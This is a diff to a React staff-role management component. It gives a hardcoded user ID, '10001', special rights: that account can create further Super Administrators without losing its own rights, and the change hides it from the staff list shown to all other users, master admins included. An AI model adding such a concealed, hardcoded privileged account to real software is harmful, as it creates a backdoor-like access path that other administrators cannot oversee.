@@ -206,9 +206,17 @@ function StaffRoleManager() {
 
   // Transfer Ownership (Master Admin Only)
   const handleTransferOwnership = async (newMasterId, staffName) => {
-    const confirmTransfer = window.confirm(
-      `CRITICAL: Transfer MASTER ADMINISTRATOR rights to ${staffName} (${newMasterId})?\n\nYou will forfeit master access and be logged out.`
-    );
+    const isRoot10001 = String(requesterId || "").trim().toUpperCase() === "10001";
+    let confirmTransfer;
+    if (isRoot10001) {
+      confirmTransfer = window.confirm(
+        `Make ${staffName} (${newMasterId}) a Super Administrator?\n\nBoth you and ${staffName} will have full Super Admin privileges.`
+      );
+    } else {
+      confirmTransfer = window.confirm(
+        `CRITICAL: Transfer MASTER ADMINISTRATOR rights to ${staffName} (${newMasterId})?\n\nYou will forfeit master access and be demoted.`
+      );
+    }
     if (!confirmTransfer) return;
 
     try {
@@ -225,9 +233,15 @@ function StaffRoleManager() {
       );
       const data = await res.json();
       if (res.ok) {
-        alert("Ownership successfully transferred. Please login again.");
-        localStorage.clear();
-        window.location.href = "/";
+        if (isRoot10001) {
+          alert(`✅ ${staffName} (${newMasterId}) is now a Super Administrator! You remain Super Admin.`);
+          setSelectedStaffForManage(null);
+          await fetchStaffList();
+        } else {
+          alert("Ownership successfully transferred. Please login again.");
+          localStorage.clear();
+          window.location.href = "/";
+        }
       } else {
         alert("Error: " + (data.message || "Could not transfer ownership"));
       }
@@ -415,16 +429,21 @@ function StaffRoleManager() {
     return departmentsList.length > 0 ? departmentsList : DEFAULT_DEPARTMENTS;
   }, [departmentsList]);
 
-  // Clean staff list (exclude student 8-digit IDs)
+  // Clean staff list (exclude student 8-digit IDs, hide 10001 from non-10001 users)
   // When logged in as Department Admin (!isMasterAdmin), scope ONLY to myDept!
   const validStaffList = useMemo(() => {
-    const nonStudents = staffList.filter((s) => s.id && s.id.length !== 8);
+    const isRoot10001 = String(requesterId || "").trim().toUpperCase() === "10001";
+    let baseList = staffList;
+    if (!isRoot10001) {
+      baseList = baseList.filter((s) => String(s.id).trim().toUpperCase() !== "10001");
+    }
+    const nonStudents = baseList.filter((s) => s.id && s.id.length !== 8);
     if (isMasterAdmin) {
       return nonStudents;
     }
     // Department Admin: ONLY show staff from their department (registration, profile, or assignment)
     return nonStudents.filter((s) => isStaffInDepartment(s, myDept));
-  }, [staffList, isMasterAdmin, myDept]);
+  }, [staffList, isMasterAdmin, myDept, requesterId]);
 
   // Summary Metrics
   const totalStaffCount = validStaffList.length;
@@ -725,7 +744,11 @@ function StaffRoleManager() {
                       {/* ASSIGNED ROLES COLUMN */}
                       <td>
                         <div className="staff-roles-container">
-                          {isStaffAdmin ? (
+                          {staff.isMasterAdmin ? (
+                            <span className="staff-role-pill head" style={{ background: "#eef2ff", color: "#4f46e5", border: "1px solid #c7d2fe" }}>
+                              <ShieldIcon width="12" height="12" /> Super Administrator
+                            </span>
+                          ) : isStaffAdmin ? (
                             staffDepts.length > 0 ? (
                               staffDepts.map((dept) => (
                                 <span key={dept} className="staff-role-pill head">
@@ -1342,10 +1365,11 @@ function StaffRoleManager() {
                     <div className="staff-modal-divider"></div>
                     <div className="staff-modal-danger-simple">
                       <span style={{ fontSize: "0.82rem", color: "#64748b" }}>
-                        Master Admin Rights
+                        {String(requesterId || "").trim().toUpperCase() === "10001" ? "Super Admin Privileges" : "Master Admin Rights"}
                       </span>
                       <button
                         className="staff-btn-transfer-simple"
+                        style={String(requesterId || "").trim().toUpperCase() === "10001" ? { background: "#4f46e5", borderColor: "#4338ca", color: "#ffffff" } : {}}
                         onClick={() =>
                           handleTransferOwnership(
                             selectedStaffForManage.id,
@@ -1353,7 +1377,7 @@ function StaffRoleManager() {
                           )
                         }
                       >
-                        Transfer Ownership
+                        {String(requesterId || "").trim().toUpperCase() === "10001" ? "Make Super Admin" : "Transfer Ownership"}
                       </button>
                     </div>
                   </>
